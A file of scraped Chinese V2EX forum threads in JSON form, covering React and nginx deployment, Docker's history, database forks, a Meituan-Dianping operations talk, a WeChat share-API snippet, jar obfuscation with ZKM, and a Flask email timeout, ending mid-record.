{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>已经有一个本地能跑的前端 react 和后端 python 项目</p>\n<p>在网上搜了一下大部分是部署静态页面的，也没有 nginx 配置的详细流程及介绍</p>\n<p>想问一下具体的流程或者有哪些教程？</p>\n</div></div>"], "reply": "4", "tittle": "请教一下各位 V 友， react 部署到 nginx 服务器详细流程？", "comment": ["没啥注意的，部署就是", "打包出文件，跟着 python 一起部署就行了", "部署应该都是差不多的吧，关系是要有个好的思路，思路对了，部署起来就事半功倍了。", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作为四年前刚刚诞生的新生儿， Docker 已然给云计算、应用交付等多个领域带来革新， Docker 的席卷之势空前巨大。不论是技术领域有什么独到之处，还是时势造就了如今大好的局面，我们都没有理由不来细细品鉴 Docker 这四年来的种种发展。</p>\n<p>本期「坐而论道」， Docker Swarm 全球 Maintainer 孙宏亮 （ Allen ） 将为大家<strong>解读 Docker 技术发展历程和 Docker 社区生态的建设</strong>。还有 <strong>Docker Birthday #4 Meetup</strong> 的精彩预告，<a href=\"https://mp.weixin.qq.com/s?__biz=MzA5MzA2Njk5OA==&amp;mid=2650096606&amp;idx=1&amp;sn=e6769fdc4e3380aaf5a32a690c69e437&amp;chksm=88626047bf15e95145c36972cb955b970bcae54716b333ecac8d20b240e6bc48def42cdd7037#rd\" rel=\"nofollow\">点击此处</a>报名，来现场和 Docker 大咖论道！</p>\n<h2>Q1. Docker 是如何诞生的？</h2>\n<h2>Allen</h2>\n<p>Docker 的诞生要回溯到 4 年前。在 4 年之前，<strong>PaaS</strong> 概念还是雏形，换言之， PaaS 在当时未必是个很成熟的概念，企业级落地面临很多障碍。这时，硅谷有这么一群人做了一个 PaaS 平台 —— 名字叫做 <strong>DotCloud</strong>。他们的 CEO 就是如今 Docker 的 Solomon Hykes （ Docker 创始人兼 CTO ）。正如刚才所说，<strong>在 PaaS 的概念尚未成熟的情况下， DotCloud 这家公司坚持做 PaaS ，势必意味着失败</strong>。</p>\n<p>失败之后，就像我在<strong>《 Docker 三年回顾：梦想依然在，人生正当年》</strong>那篇文章中总结的一样，痛定思痛， Solomon 觉得 PaaS 的时机在四五年前尚未成熟。但是，在创业过程中，他们感受到一些事物可以给整个行业带来更多的价值，这个技术就是容器技术。他们把当时 DotCloud PaaS 平台中的容器技术，以开源项目的形式向全世界公布，这就是如今的 Docker 。\n<img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/%E6%9C%AA%E6%A0%87%E9%A2%98-1.png\"></p>\n<p>这时 Docker 已经初具雏形，它的确对整个 IT 世界带来了巨大的变革，也有越来越多的开发者参与到了 Docker 社区当中。当社区的发展如日中天之后，公司直接把 DotCloud 的 PaaS 业务卖掉了，选择专注做 Docker ， <strong>这就是 Docker 公司的诞生</strong>。</p>\n<p>这家公司一步步发展到如今，四年时间一直聚集着全世界的目光。虽然它已经卖掉原来的 PaaS 业务，但仍然保留着公司的技术核心——容器技术。</p>\n<p>事物的发展都要经历从不成熟到成熟，经历过不成熟的周期之后， Docker 这家公司反过来依附 Docker 技术 ，又逐渐回到 PaaS 平台。因为 <strong>PasS 平台是真正可以给一家公司带来足以支持未来企业发展的收益</strong>。</p>\n<h2>Q2. Docker 技术在发展历程中有哪些重要的技术变革和里程碑？</h2>\n<h2>Allen</h2>\n<p>这四年间确实有很多翻天覆地的变化。我认为这些变化是由几方面的因素促成的：</p>\n<p>第一方面，整个<strong>行业</strong>对容器技术的要求不断提高，达到更良性的状态。在这种情况下 Docker 会出现技术和结构上的变化。</p>\n<p>另一方面， Docker 虽然是一个开源项目，但它是由一家商业公司支持。商业公司的<strong>商务诉求</strong>肯定也会在 Docker 软件中有所体现，这也会对 Docker 的技术或架构造成影响。这是外来的需求。</p>\n<p><strong>内部和外部两方面诉求，推动了 Docker 技术的变化</strong>。</p>\n<p>说到具体的<strong>变革</strong>，我认为 ，在<strong>最初的两年</strong>， Docker 要迅速构建起<strong>开发者生态</strong>，开发者生态要围绕开放性和镜像。 Docker 公司要维护好镜像，确保镜像的<strong>唯一性和全球唯一</strong>，不允许他人复制。</p>\n<p>但是到了<strong>两三年之后</strong>，在开发者生态达到令人满意的状态，在稳定占领开发者市场之后， Docker 公司要考虑的是，如何真正地<strong>帮助企业解决问题</strong>，包括调度、网络问题等。</p>\n<p>到了<strong>最近一年</strong>，<strong>编排概念</strong>在行业当中变得非常活跃。面对这种场景， Docker 必须要构建自己的壁垒。这<strong>未必是技术壁垒，但很有可能是商业壁垒</strong>。依附于 Docker ，将 <strong>swarm mode</strong> 这种编排模式加入其中，就构建了现在这样一个模型。\n<img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/123.png\"></p>\n<p>因此，技术变革大致可以分成 3 个部分。第一部分，<strong>构建开发者生态</strong>；第二是<strong>解决客户的需求</strong>，包括网络、存储、调度等方面；第三，主要是随着行业中容器生态向<strong>编排发展</strong>的趋势， Docker 公司必须要构建商业壁垒或者技术壁垒。</p>\n<h2>Q3. 刚才提到聚集开发者生态，但 Docker 同时又是一家商业性的公司。生态的开放性和商业壁垒之间是否会存在矛盾？</h2>\n<h2>Allen</h2>\n<p>这两者之间势必会有矛盾，这也是大家有所争论的地方。在技术的世界里，往往很多工程师<strong>以乌托邦的情节</strong>来看待技术，例如他们认为开源技术，就必须要按照开源的运作方式，非常纯粹地运营。但事实往往并非如此。这时社区里面会产生争论，比如说有些人觉得软件的架构要非常纯粹，层次非常清晰，但是 Docker 现在层次的一些变化，就会引起他们的不满。这就是带来的一些冲突。</p>\n<h2>Q4. 相比于其他技术，你是如何评价现在的 Docker 生态？</h2>\n<h2>Allen</h2>\n<p>我觉得软件的开源可以迅速够建起用户生态，在开放的环境下，用户的参与度也会越来越高。 Docker 社区的主要推动者是 Docker 这家公司，因此该项目成长的初期，聚拢在 Docker 周边的较为<strong>集中的管理方式反而有利于事物的迅速崛起</strong>。当然，容器生态中同样会有一些负面的生态，认为 Docker 呈现出了些许封闭的状态。在如今残酷的商业环境下，一家公司如果想要容纳所有声音，同时要快速发展，在我看来很难实现。所以从这个角度来讲，与其他的技术社区相比，<strong>随着商业性的融入， Docker 的开放性会有一定程度的萎缩；但是，它的发展速度会非常快</strong>。\n<img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/WechatIMG13.jpeg\"></p>\n<h2>Q5. 能跟我们谈谈 Docker 公司对于生态建设有哪些投入？</h2>\n<h2>Allen</h2>\n<p>Docker 公司投入了很多精力，在容器生态里， Docker 开源项目拥有<strong>最多的全球贡献者</strong>。这也得益于 Docker 公司在前期做了很多铺垫工作，引导所有的开发者参与其中、共同维护这个项目。从这个角度来讲，包括 <strong>Docker Engine</strong> 本身，我们也可以认为它几乎是最稳定的。但从数据统计来看，最稳定并不意味着没有 bug ，这是从软件学角度来讲。。</p>\n<h2>Q6. DaoCloud 和 Docker 公司将联合举办 Docker 4 周年庆生活动，有哪些精彩看点？作为演讲嘉宾你会分享哪些话题？</h2>\n<h2>Allen</h2>\n<p>Docker 4 周年的活动也即将到来， DaoCloud 联合 Docker 主办了这次社区性的活动。我觉得最大的看点，就是我们非常有幸地邀请到了<strong>来自 Docker 公司 DevOps 专家 John Willis</strong>，他将给我们分享 DevOps 方面 3 个非常重要的关键点，对企业践行 DevOps 肯定会有很多的启发。</p>\n<p>与此同时，这也是一个技术盛宴，我们也会带来一些非常欢乐的环节，让大家在这个社区里面玩得开心的同时也能够学到东西。</p>\n<p>我个人在不同城市的介绍内容会有所不同。在<strong>北京</strong>，我主要会介绍 Docker 现在的新发展，<strong>rolling update</strong> 等新功能的进展以及它的实现。在<strong>上海和深圳</strong>场，我会作为 Docker mentor ，做一些 <strong>Docker 相关的实验 Demo</strong>。例如如何作为开发者来构建镜像；构建镜像之后，如何部署，如何来通过健康检测的方式来让大家感受到 Docker 的魅力。同时，如何部署服务，部署一个分布式系统。我的所有的 Demo 只是想让大家知道一点，<strong>无论开发者还是运维人员， Docker 所有操作都非常简便，这也是 Docker 容器技术给我们带来的好处</strong>。</p>\n<p><strong>福 利</strong></p>\n<p>DaoCloud 作为 Docker Birthday 4 周年生日会中国地区的唯一承办方，将在北京、上海、深圳和成都举办 4 场四城联动 Docker Birthday 四周年 Meetup 。点击此处，<a href=\"https://mp.weixin.qq.com/s?__biz=MzA5MzA2Njk5OA==&amp;mid=2650096606&amp;idx=1&amp;sn=e6769fdc4e3380aaf5a32a690c69e437&amp;chksm=88626047bf15e95145c36972cb955b970bcae54716b333ecac8d20b240e6bc48def42cdd7037&amp;scene=25#wechat_redirect\" rel=\"nofollow\">立即报名</a> Docker Birthday Meetup 活动！</p>\n<p>下期我们将从 Docker 在企业落地的角度为大家解读 Docker 过去四年的发展。</p>\n<h2>推 荐 阅 读</h2>\n<p><a href=\"http://blog.daocloud.io/docker-talkshow01/\" rel=\"nofollow\">《“云原生”时代：挑战 寻变 共赢》</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "坐而论道 | Docker 四周年：新生儿与独角兽（上）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>搜 mariadb 的时候冒出一个 alisql ，一看是阿里巴巴的作品，号称性能提升 70%以上，有没有 V 友们在用这个？我就担心后期阿里会不维护这个了， bug 层出也没人管，从稳定性和兼容性到底哪个好？</p>\n</div></div>"], "reply": "9", "tittle": "生产环境用 mariadb 还是 AliSQL？", "comment": ["长期项目选择非商业公司项目", "今天刚看到阿里云成为 mariadb 白金赞助商，感觉阿里这是在砸钱发展自有数据库分支啊", "1. 阿里供给 MariaDB 的彭立勋，会把 AliSQL 的 patch 都集成到 MariaDB\r", "2. ALISQL 跟不上 MYSQL 的版本号，我很担心一些安全方面的问题\r", "3. AliSQL 的功能是挤牙膏式的，说好的功能都是一步一步释放的\r", "\r", "\r", "所以建议 MariaDB 。", "可以考虑 TiDB ( ", ")", "打几个 patch 也整个分支叫 AliSQL ？", "mysql 啊，很多 feature 已经开始分道扬镳了，你又不是大厂", "建议用 percona 的版本", "没技术能力用分支的话，老老实实用 MySQL", "我最近也装了 percona 的 cluster"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"www.shurenyun.com\" rel=\"nofollow\">数人云</a>“当西方的 SRE 遇上东方的互联网” Meetup 第一弹实录来啦！</p>\n<p>本次分享嘉宾是美团点评运维中心高级总监钟红军，他向我们详细介绍了美团点评近 3 年来在大规模运维的理念和实践方面的探索，尤其是在运维自动化和数据运营方面的工作和效果——</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/6d2X6PuM.png\"></p>\n<p><strong><em>钟红军 / 美团点评运维中心高级总监</em></strong></p>\n<p><strong>美团点评集团运维中心高级总监，此前曾工作于百度，腾讯， PPTV 等互联网公司，熟悉系统、网络、运维、安全、数据、开发等多个领域。</strong></p>\n<p>今天我将美团点评这几年在运维方面做的一些工作，以及自己的思考与大家分享一下。美团点评整个运维团队 100 多人， base 在北京和上海，美团和点评两家公司在 2015 年合并，所以团队也是两地都有。运维中心有 SRE 团队有数据库的团队，有自动化开发等。</p>\n<h2>阶段 1 ：工具化</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/K0OjnA82.jpeg\"></p>\n<p>我是 2013 年从百度加入点评的，之前在腾讯，当时想法很明确，因为腾讯、百度的运维体系相对比较成熟，包括运维工具、自动化的工具都是一整套，比较好用，对我来说最遗憾的是这些工具都不是自己做的，在腾讯我只是一个用户，每天用那些运维工具却不知道这些工具如何做出来的。所以在美团点评给自己的使命，就是要把美团点评的运维做到腾讯、百度的水平，把缺失的过程、成长的过程由自己做出来。美团点评运维团队在 2014 年－ 2015 年业务发展非常快，公司有几万人，研发团队很大，那时候的运维做得还是处于相对基础的阶段，遇到了问题，不分白天黑夜操作压力很大，尤其是出了事故要应急，过节需要各种的准备，值班也很混乱。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/rv8Ex5Ih.jpeg\"></p>\n<p>最初想法很简单，希望把这事情做到极简、规范和一致，保证操作能做到几十年不变，不管谁来做都是同样的操作。比如装一台机器或者是部署一个应用，希望它做一百次、一千次也是这样。第二，把程序代替繁琐的工具，第三，所有的操作都可记录，以免出了事故找不到是谁操作的。第四，把运维操作往前推，希望运维操作不要由运维来做了，由研发来做，因为需求本身来自于研发，不是来自于运维，所以需求来了也应该由研发去做。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/Vhd4Ud3s.jpeg\"></p>\n<p>以上是我去年总结的四句话，看似很普通的四句话，是美团点评做自动化过程中的一个线条。<strong>第一句话，凡是不能变成工具的规范我们都不看。</strong>做运维大家会想到出一点规范，比如发布规范、部署规范、命名规范，机器取名得有一个规范，不规范操作容易出错。在我看来，任何一个规范如果不能变成一个工具去约束的话，这规范没有意义。写一篇文档或者一个要求，发给研发去看，只要它不能变成一个工具就没有意义，因为这个规范出来，如果布置工具的话，实现 100 次可能有一次有人不遵守。但其实他一次都不遵守，好过做 100 次只有一次不遵守，因为每次都不遵守，问题很好查，而做了 100 次有一次不遵守，就很难查。比如晚上服务挂了，一千台的服务器，是其中一台的问题其实挺难查的，如果这一千台有共同的问题，就很好查。</p>\n<p>规范本身没有任何的意义，只有它变成一个工具才有意义，因为强调的是一致性，希望它犯错也是每次犯同样的错，不要每次犯不一样的错。所以，我们的点评团队没有 howto ，没有文档，整个运维很少做文档。当然现在也做了， 100 多人还是要做一些不能形成工具的规范，不过还是坚持这一点，规范应该想办法做一个工具。比如我们有一个静默期的要求，春节长假前三天不允许发版本。那么从 2013 年开始点评就执行这个规则的，因为它有工具支持，发布系统要有开关，一到时间就能关掉，必须走运维的审批流通，这个流程是自动化的。但在 2015 年，新发布系统不支持这个开关，因此把这个规范停下来了，不执行这个规范，因为没有工具支持，执行这个规范没有意义，发个通知告诉大家要静默期，首先要挨骂，其次大家该怎么样怎么样，骂完之后扔不执行这个规范，后来我们就停下来，直到今年春节的时候，终于支持这个功能了再执行这个规范。</p>\n<p><strong>第二，不是增加 power ，而是减少 power 。</strong>解释一下，在 2014 年－ 2016 年做运维自动化相关工具的时候，团队的内部也是有很多的争议的，其中一个很重要的争议就是，有相当多的同学认为做自动化工具是给运维的人更大的 power ，能做更多的事，大家无限畅想这个工具可以怎么样，一按键所有的机器都重启起来，其实很悲剧。我的理念是工具是为了减少 power ，不是为了增加 power ，为什么这么说呢？如果是使之为了更强大的话，其实手工操作是最强大的，给一个 ssh 命令的窗口，一个 root ，就是最强大的，什么都可以做。工具本质是为了限制，不是为了增强，是干不了什么而不是能干什么。比如做自动化流程系统，在考核自动化流程系统的时候，看它的流程多不多，流程越多说明做得越烂。作为一个运维来说，我认为不应该有超过 10 个流程。常见的运维操作不会超过 10 个，加机器、减机器、重启机器，其他的配一个域名等。如果管理到位一点，比如配一个 web 的 IP ，这些应该都不需要运维来做，所以超过 10 件事是有问题的。</p>\n<p><strong>第三，解决一个复杂的问题，不可以引入另一个复杂问题作为代价。</strong>很多做运维的同学，尤其是做了一段时间后，学过很多各种各样的概念，从最早的 ITIL ，到现在的 SRE 等等，容易犯一个错误，就是喜欢用复杂的方法解决复杂的问题，运维的体系也好、运维自动化也好，其实是一个简单的问题。回到最初来讲，运维解决的问题是保障线上的稳定，只有这一件事情。运维自动化解决什么问题？就是让所有第三方因素或者是人为的因素对线上稳定性造成的伤害越少越好，这个越少越好来自于第一变更越少越好，我们在腾讯后期提出这种理念，没有变更才是最好。以前大家说管理变更，变更要管理起来，这个变更完了是永远管理不好的，最好不要有变更。比如扩容，很多同学提出节假日了容量不够，要实现一键扩容，在我的理解里面，我希望实现不需要扩容。</p>\n<p>解决一个复杂问题，如果是用一个复杂的方法去解决，或者是引入另外一个复杂问题的话，把这东西搞得更复杂了，这是不对的。比如做监控的时候，是做减法而不是做加法，因为搞太复杂了没有意义，假定监控报警一天超过一千个了，是没有区别的，因为这时候运维做的事情肯定就是关手机，所以要做减法，不能引入复杂的问题，一定要找一个简单的方法。</p>\n<p>第三句话和第四句话是类似的，就是<strong>工具“极简”是一种使命</strong>。我看过很多运维自动化的工具，包括腾讯、百度，还有国内很多互联网公司，因为我当时在招人，面试过互联网公司做工具的同学，很不幸最后一个人没有招，我发现他们做工具的思路和我的不太一样，很多做自动化工具的同学，往往以为让工具有价值，就把它做得复杂，看起来很华丽。总之，这不是我的思路，我的思路是极简。</p>\n<p>比如这个运维自动化的工具假设只有一个按钮，那当然是最好的，但是做不到，我们不是乔布斯。再如做一个扩容，有很多选项可以选的，什么机房、哪个机房，尤其是规模比较大的话什么类型的机器、多少内存、多少 CPU 等等，很多同学认为选项越多，这个工具越好，越强大，在我看来选项越少越好，多了以后，第一容易出错，万一选错了，接下来就涉及到研发和运维的 PK 了。还有一个是浪费了时间，扩容一台机器应该是一件不花时间的事情，选项那么多就要看半天的时间。从工具表现来说，也是工具越简单越好。但造成一个没有想到的后果，工具做得很难看，后来我们也招前端的同学来把它做好看一点，而不是做复杂。这几年做运维自动化总结下来就这四句话。</p>\n<h2>美团点评的自动化工具</h2>\n<p>讲一下美团点评的自动化工具。最早做的是这样一个系统，抽离一下主要是四个东西：中间是一个 CMDB ，一套流程系统，一套操控平台和一套监控系统。自动化主要是四件事——</p>\n<p>第一，资料。所有的自动化基于非常准确、详尽的资料，尤其是虚拟化、云计算比较流行的时代，一台机器在哪个交换机上是很重要的信息。比如自动扩容的时候，一定不希望同一个应用的两台机器扩到同一个交换机上，所以必须要知道这个信息。资料当时做得很详细，比如它有几段网卡，是双向还是单向连接等。资料是非常重要的，因为美团点评的规模很大，大量的机器部署在不同的城市，不可能每次真正操作的时候临时再看。再如部署的打散问题是非常关键的，部署一个应用 100 个虚拟机或者 200 个虚拟机，要确保这 200 个虚拟机是打散的，不能在同一个交换机或者是同一个物理机，或者是同一个机柜或者是同一个 IDC ，要按照一定的规则打散它，确保挂了之后会止损，比如四分之一、三分之一、二分之一，就全靠资料库的完备，只要差一点点就都有问题。</p>\n<p>第二，标准操作。刚才说到流程不会超过 10 个，这种运维的标准操作也不会超过十几个，把这些操作提炼为标准的操作，叫做原子化的操作。想象一下，自己做一个扩容、做一个上线为例，申请一个机器，初始化它的环境，把它加入监控，做一个配置，基本上这些操作是相对固定的，原子操作是可以落地下来的，它是一个标准化的动作。这个标准化的动作把它形成一个操作库，会有人确保这个标准化动作本身的健壮性，比如重启一台机器这样的操作，肯定要把操作本身做得特别健壮，确保所有的运维，无论任何时间，做重启动作的时候一定用的同一个标准的操作。</p>\n<p>第三，场景是一个复杂的动作，我们叫做流程。比如今天要给业务部署 300 台机器，或是今天上线一个新业务等等这是一个场景，一定能分解很多标准化的操作去完成的，场景就是流程，所以在开发的时候我们是流程系统。</p>\n<p>独立于这三个之外就是监控。这个监控是多层面的，操作系统、监控应用，也要监控发布变更，我要知道有多少变更，多少发布。总的来说，美团点评自动化的体系就是基于这么一个大框架，当然框架有 4 个，里面的产品有很多。只要框架框好了，产品多是没有关系的，比如流程系统做两套没有关系，只要在同一个框架就好。</p>\n<p>自动化工具讲完了，讲一下当时的过程。当我们按刚才说的思路做了很多自动化工具之后，很快陷入了一个迷茫，觉得运维不过如此，人生好像很灰暗的感觉，而且这种工具很会带来一种副作用，刚开始的时候大家还是挺开心的，有了工具之后迅速的工作效率提高了，需要半夜应急的事情就少了，有些事情真的可以研发去处理了。有一次运维团队年会，大家出发了以后突然接到电话，有一个事情研发那边需要线上做一个操作，我就跟他说有流程，在流程上申请一下就好了，而且是自动的，果然他一申请把它的操作做好了。</p>\n<p>换做以前，那一年在腾讯的时候，我们的大部门去越南团建，万一出故障了谁处理？于是大家都去了，我一个人没有去，在家里守着电脑，等着处理故障。后来在美团点评，研发自己的流程就可以把这件事搞定，说明自动化工具确实是有效的， 2014 年底，这套东西还获得了公司季度大奖。今年我们运维团队获得了美团点评的年度大奖，还是非常不容易的。当时我们做自动化做完后，觉得很开心，然而开心没有几天大家陷入迷茫了。工具做太多之后，很快陷入了一种失控，解决问题开始带来问题了，带来问题非常多，开发也很多，很乱，信息开始不一致，工具越来越危险，于是我们开始思考——</p>\n<h2>阶段 2 ：产品化</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/xaTz1i8f.jpeg\"></p>\n<p>思考的结果，我们把它叫做产品化。一开始做工具，认为它是一个工具，实现自动化的工具，没有把它理解为产品，后来思路转变了一下，把这工具转变成产品，就跟开发一个美团这样的 APP 一样的，它是一个产品，比如把这个 CMDB 或者流程定位成一个产品而不是一个工具，当想到这一点之后就豁然开朗了，产品就不一样了，做产品首先有产品经理，也可以招女同学来做 PM ，诸如此类运营都做起来了。</p>\n<h2>阶段 3 ：运营化</h2>\n<p>做了产品之后，工具确实解决了刚刚说的失控问题，但又陷入一个迷茫，简单来说就是运维和业务的关系。运维可以说在整个技术链条的最后端，食物链的最低端，如何才能体现运维价值？这时我们又整理出一套新的思路出来，叫做质量运营，这里面的想法与 SRE 有一些类似。质量运营的想法很简单，从监控系统里面不断的提炼数据，把监控的数据变成一个质量指标，以这个指标去驱动整个研发体系。因为很多的问题都是开发相关的，比如这个研发 SQL 语句写得比较差，慢 SQL 比较多，就比较容易出故障，线上压力一旦大一点，数据库都抗不住了。对这个问题以前的做法，现在线上挂了，查出来是一条慢 SQL 引起的，大家开始互相 PK ，研发说我没有改过，这条 SQL 一直都是这样的，运维说就是你这条 SQL 引起的，这是常见的套路。但是，现在反过来，运维平时就监控每个应用的慢 SQL 的个数，如果比较多，我们认为它是一个亚健康的状态，即使没有出问题，也应该降下来。</p>\n<p>美团点评做的不止是一个慢 SQL 这么简单，我们把运营上很多的质量数据，根据这个质量数据去推动研发把质量数据改善，运维不断的检测这个数据，直到这个数据确实降下去了。 DOM 是美团点评的质量平台，类似于报表的平台，在上面不断放入很多的质量数据，拿这个数据去推动研发，基本上能想到的都有，跳板机、质量运营、消息队列， CAT 、云平台、 Nginx 等，计划中的每一件事情都被定义了出来，有一套质量指标，质量指标完全可以追溯和详细化的，所谓的追溯就是可以看到过去以来所有的，详细就是可以一直往下点，比如这个部门这台 DB 得分是 75 分，点进去看到为什么得 75 分？可能有慢 SQL5000 个，再点进去可以看到慢 SQL5000 个到底是哪 5000 个，这 5000 个到底是谁的？因为 CMDB 里面记录了所有的应用信息，研发人员对应的信息，所以效率非常高。</p>\n<p>还有一个 DB 的健康表，其中有慢查询得分多少，磁盘使用率、锁情况得分多少，延迟一致性、绿帽子库，大表，容量系数等等，数据会不断的迭代。因为公司人比较多，美团点评的做法一般是横向对比。任何一件事情总有团队做得比较好，有团队做得比较差，让大家做横向对比，可以看到哪个团队做得比较好，哪个团队做得比较差。通过这样的方式刺激大家做改进，因为谁也不愿意自己团队做得比别的团队差，这是作为技术团队的修养。</p>\n<p>质量运营，一句话就是提炼指标出来，不是等到它出事了，也不是响应研发需求，而是运维主动提炼这种指标出来，并推动研发把可能造成影响的指标降下去。去年 2016 年做的比较多的，一个是应用的平均响应时间，比如一个 java 应用， call 一下的平均响应时间，时间很长肯定容易出故障，负载一高就有超时等等各种故障，平时响应的时间 100 毫秒看起来还好，但是负载一旦提高就会有问题了，所以要求不能超过 50 毫秒，这个要求一旦定出来，就出质量报表，看公司所有的应用，现在的平均值是多少、高了是多少、低了是多少，分成团队、部门，马上出 TOP10 、 TOP20 的列表，推动做得比较差的同学改进。还比如 APP 的响应时间，也是类似的。慢 SQL 见得比较多，我们的打压还是比较有用的，这样做下来，慢 SQL 引起的故障就少了很多。</p>\n<p>自此之后，运维团队和之前有了很大的变化，从完全辅助被动的状态，开始进入所谓的主导的状态。过去都是研发需要运维做什么，然后运维做什么。现在都是运维需要研发做什么，大家来做什么。团队的职责比以前有很大的变化，现在大概有三部分：第一是质量运营，第二是自动化的开发，第三是 DO 分离的 O 。三年前美团点评基本上就在做这三部分， D 是开发 O 是运维，我们是将 DO 分离的 O 逐渐减少。</p>\n<h2>总结与思考</h2>\n<p>简单总结一下，美团运维的探索之路，从一开始做工具、到做产品，到做运营， 2016 年主要的精力是做运营，团队也变成了四大部分。以前自动化工具注重的是一些功能，团队绩效就是看今年做什么功能，但是这两年不看功能了，看的是工具推广得如何，运营得怎么样。现在已经是数据驱动了，早期是事故驱动比较多，出问题了由大家来驱动，做各种改进、各种辅助、各种 case study 。流程驱动，运维设计各种各样的规则，其实都没有用，没有哪一次规则起过作用。现在是数据驱动，看数据报表，而且不断的迭代。</p>\n<p>最后留给大家两句话：云时代以后，大家离基础设施越来越远之后，运维怎么体现价值？第二，到底是往上走还是往下走？所谓的往上走就是往业务的角度走，往下走就是相对比较传统的，比如说我对 OS 研究更深等等，到底应该如何走？这是我们尚在思考的话题。谢谢大家。</p>\n</div></div>"], "reply": "12", "tittle": "活动实录|工具化、产品化、运营化——「美团点评」运维团队背后的故事", "comment": ["+1", "这篇很好，看后收获很多。", " finghting", "不错的分享", "其实就是运维转型\r", "会说话，会写 PPT ，爱动脑子的运维转型 PM 了\r", "还想搞技术，会编程的运维转开发了\r", "剩下的运维就淘汰了", "+ 1\r", "这种干货级别的活动实录很让人长见识！", "受益良多。", " 阔以阔以", " 淘汰是不是就失业了", "“绿帽子库”是什么鬼", "mark 不错", "产品化 -------》\r", "我们团队以前有个鹅厂过来的 PM ，感觉毕竟专业，跟我们这种泥腿子出身的就是不一样。后面确实做了一个比较有影响力的内部产品。可惜后来由于组织架构调整转岗了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在做一个动态的商城页面，需要提示用户分享，同时希望修改用户分享时的文字。</p>\n<p>我在<code>wx.ready()</code>接口中绑定了该接口，但是分享时还是没有修改成功。是需要做什么操作么？希望有经验的朋友来讲讲。谢谢。</p>\n<pre><code>wx.ready(function () {\n\twx.onMenuShareTimeline({\n\t\ttitle: '修改的标题', // 分享标题\n\t\tlink: 'http://s.kantonghua.cn', // 分享链接,将当前登录用户转为 puid,以便于发展下线\n\t\timgUrl: 'http://s.kantonghua.cn/1.png', // 分享图标\n\t\tsuccess: function () {\n\t\t\t// 用户确认分享后执行的回调函数\n\t\t\talert('分享成功');\n\t\t},\n\t\tcancel: function () {\n\t\t\t// 用户取消分享后执行的回调函数\n\t\t}\n\t});\n\twx.error(function(res){\n\t\t// config 信息验证失败会执行 error 函数，如签名过期导致验证失败，具体错误信息可以打开 config 的 debug 模式查看，也可以在返回的 res 参数中查看，对于 SPA 可以在这里更新签名。\n\t\talert(\"errorMSG:\"+res);\n\t});\n});\n</code></pre>\n</div></div>"], "reply": "4", "tittle": "微信 JSSDK 内修改分享内容的 api: wx.onMenuShareTimeline 是不是无效？", "comment": ["这个接口是没有问题的，分享内容没变有可能是因为手速太快 js 没有来得及执行，可以打开调试模式看一下 wx.ready 是什么时候 success 的。另外一定要用微信 web 开发者工具： ", "\r", "\r", "在不开调试模式的情况下也可以观察到微信 jssdk 的调试信息", " 我确实是在观察到 ready 事件后再进行分享的，请问你有样例可供参考么？谢谢", "  \r", " ", " ", " 感谢，蛮奇怪的，昨天还不能成功，今天就可以了。"]},
{"content": ["<div class=\"topic_content\">比如我想对一个 jar 包进行混淆，那个 jar 包里面包含一些依赖包，我使用 ZKM 混淆时可不可以跳过这些依赖包进行混淆，如果可以，怎么设置，求指点！！ 1</div>"], "reply": "2", "tittle": "有人使用过 Zelix KlassMaster(ZKM)进行混淆吗", "comment": ["只用过 proguard ， proguard 不能满足需要？", " proguard 感觉混淆不太好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个简单的发送邮件脚本，在本地上可以成功发送邮件，放到云服务器上发送失败，查资料查好久了， smtp 服务器试过 <a href=\"http://smtp.live.com\" rel=\"nofollow\">smtp.live.com</a> 和 <a href=\"http://smtp.qq.com\" rel=\"nofollow\">smtp.qq.com</a> ，云服务器试过阿里云和 DO ，貌似报错都是类似的，但是一直没解决。\n测试脚本如下：</p>\n<pre><code>import os\nfrom flask import Flask\nfrom flask_mail import Mail, Message\napp = Flask(__name__)\n\napp.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_TLS'] = True\napp.config['MAIL_USE_SSL'] = False\n#app.config['DEBUG'] = True\napp.config['DEBUG'] = False\n#app.config['MAIL_SERVER'] = 'smtp.live.com'\napp.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME')\napp.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')\n\nmail = Mail(app)\n\n@app.route(\"/\")\ndef index():\n    msg = Message('hello', sender='someuser@hotmail.com', recipients=['someuser@qq.com', 'someuser@126.com'])\n\n    msg.body = 'hello message from flask'\n    mail.send(msg)\n    return 'Sent'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=False)\n</code></pre>\n<p>DO 上用 <a href=\"http://smtp.live.com\" rel=\"nofollow\">smtp.live.com</a> 截取部分报错如下：</p>\n<p>File \"/usr/lib/python2.7/<a href=\"http://smtplib.py\" rel=\"nofollow\">smtplib.py</a>\", line 291, in _get_socket\nreturn socket.create_connection((host, port), timeout)</p>\n<p>File \"/usr/lib/python2.7/<a href=\"http://socket.py\" rel=\"nofollow\">socket.py</a>\", line 571, in create_connection\nraise err\nerror: [Errno 110] Connection timed out</p>\n<p>一直没解决，谢谢各位大佬</p>\n</div></div>"], "reply": "12", "tittle": "Flask 小白测试发送邮件失败，各位大佬看看有啥毛病？", "comment": ["消灭零回复", "从贴的错误看是连接不上发信服务器？", " 本地监听 localhost 可以的，不知道咋回事啊，是不是因为换成 0.0.0.0 造成的？", "别沉啊。。。一直没解决, 心好累", "一般云服务器都是封掉发邮件相关端口的", "贴的代码里手误注释了 smtp 服务器那行，实际脚本里没有注释掉", " 那你们是怎么将有注册功能的网站部署到云服务器上的? 博客系统需要提供用户注册啥的", 